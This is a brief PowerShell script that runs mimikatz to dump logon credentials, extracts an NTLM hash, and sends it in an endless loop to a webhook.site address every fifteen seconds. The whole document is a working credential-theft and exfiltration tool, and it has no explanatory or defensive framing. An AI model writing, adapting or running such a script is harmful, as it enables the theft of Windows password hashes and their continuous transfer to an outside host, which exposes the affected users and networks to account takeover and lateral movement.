 do {

	$NTLM_cmd = ./mimikatz.exe privilege::debug sekurlsa::logonpasswords exit | Select-String NTLM 
    $NTLM = ($NTLM_cmd -split '\s+')[4]
    echo $NTLM
    
    
    $postParams = @{username='junction';ntlm=$NTLM}
    Invoke-WebRequest -Uri https://webhook.site/3e5ec05c-2bcd-47d1-af56-fb46ee0c84f9 -Method POST -Body ($postParams|ConvertTo-Json) -ContentType "application/json"
    
    Start-Sleep -s 15
    
} while (1) 
